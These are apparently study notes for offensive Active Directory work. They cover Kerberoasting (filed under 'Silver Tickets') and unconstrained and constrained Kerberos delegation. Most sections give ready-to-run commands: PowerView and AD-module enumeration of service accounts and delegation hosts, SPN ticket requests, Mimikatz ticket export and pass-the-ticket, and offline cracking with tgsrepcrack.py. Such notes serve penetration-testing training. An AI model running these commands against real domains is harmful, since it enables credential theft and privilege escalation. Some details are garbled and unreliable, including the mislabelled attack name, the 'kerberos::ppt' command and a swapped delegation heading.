> https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal

> https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos

![Kerberos](https://lh5.googleusercontent.com/UeGIGlYK5NvC4FIRPCzOgdeL_UeDjrvszzw2ZbJgitgE_Mdbi1Z6HZSG9VHfBJSDwP2W4ifN9JkpSa9jx-BA=w1360-h611-rw)

> https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H

# Silver Tickets

* Password hashes of service accounts could be used to create
* Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account.
* Can request a ticket and do offline brute forcing.

![Kerberos Silver Ticket](https://lh5.googleusercontent.com/OKN30PLvn-kXiOXCz4fHfd7mHn_SUCdTnJBRB_NRYpWj9B57kc8cbyn1Ga-pLlWQ38jNvRs7Cz-gpQr0iFpg=w1360-h611-rw)
> https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD

* KDC does not handle authorization
* Can request TGS for any service
* TGS is encrypted using target-service NTLM hash
* .:. it is possible to brute-force the TGS to get target-service account credentials

## Find Service Accounts

GetUserSPNs
> https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

PowerView (SPN = Service Principal Name)
```
Get-Netuser -SPN
```

ActiveDirectory Module
```
Install-ActiveDirectoryModule -DllPath C:\AdModule\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\AdModule\ActiveDirectory.psd1

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
## Request SPN Ticket

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<server-name>"
```

PowerView
```
Request-SPNTicket
```

## Save Tieket

List all tickets in cache (check if granted)
```
klist
```

Mimikatz
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
## Bruteforce

```
python.exe .\tgsrepcrack.py .\password.txt '<ticket>'
```

or use John


# Kerberos Delegation

* Allows reusing the end-user credentials to access resources hosted on a different server.
* Used when `Kerberos Double Hop` is required.
* Impersonating the incoming/authentication user is necessary to work.
* Types:
  * Unconstrained (only Windows Server 2003 <) - Allow authentication to any service in the domain
  * Constrained

## Unconstrained Kerberos Delegation

![Kerberos Delegation](https://lh5.googleusercontent.com/MgazYuWpQRvg25S48nMh5iPbeX76N-GF078pRWy7jBo4MqO3k4rPaBHdZXDL-GLEqv2GDfrsMlp6gNahYYLU=w1360-h611-rw)
> https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY

1. User provide credentials to DC
2. DC returns TGT
3. User request TGS for web service
4. DC provides TGS (TGS contains user's TGT)
5. User sends TGT and TGS to web Server
6. Web server service account use user's TGT to request a TGS got database server from DC
 * Web server service account can decrypt TGS and extract the user's TGT
 * This is because TGS is encryoted with web server service account's NTLM hash
7. Web server service account connects to database impersonating the user

### Identifying Nodes with Unconstrained Delegation Enabled

```
Get-NetComputer -UnConstrained
```

```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

### Attack Pattern

* Compromise the server that use unconstrained delegation
* Wait for a high privileged connect
* Once connected, export all the tickets including TGT for that User

```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

Reuse tickets with
```
Invoke-Mimikatz -Command '"kerberos::ppt C:\tickets\admin.kirbi"'
```

## Constrained Kerberos Delegation

* Only provide access to specified services on a specifiv computer
* Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute
* Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute

### Identifying Users with Unconstrained Delegation Enabled

```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

```
Install-ActiveDirectoryModule -DllPath C:\AdModule\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\AdModule\ActiveDirectory.psd1

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
### Attack Patterns

* Protocol Transition used in SSO
* Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified.

> https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/


# Reference:
- https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/
